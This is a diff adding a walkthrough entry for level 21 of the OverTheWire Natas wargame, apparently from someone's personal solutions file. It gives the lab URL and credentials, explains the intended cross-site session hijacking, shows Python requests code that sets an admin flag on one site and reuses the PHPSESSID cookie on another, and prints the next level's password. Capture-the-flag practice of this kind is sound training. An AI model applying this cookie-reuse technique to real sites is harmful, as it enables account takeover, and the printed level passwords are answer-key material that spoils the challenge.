@@ -402,3 +402,16 @@ print(content)
 print('='*80)
 
 // IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
+
+lvl 21 --> lvl 22
+http://natas21.natas.labs.overthewire.org/
+natas21
+IFekPyrQXftziDEsUr3x21sYuahypdgJ
+// The point of this level is to realise a Cross-Site Session Hijacking
+// We connect to one site, post value ('submit' = '1' and 'admin' = '1'), save the resulting cookie 
+// We connect to the other side, set the new cookie to the previous one
+// See the python code: 
+response = session.post(experimenter, data = {'submit': '1', 'admin': '1'}, auth=(username, password))
+old_session = session.cookies['PHPSESSID']
+response = session.get(url, cookies = {"PHPSESSID": old_session}, auth=(username, password))
+// chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
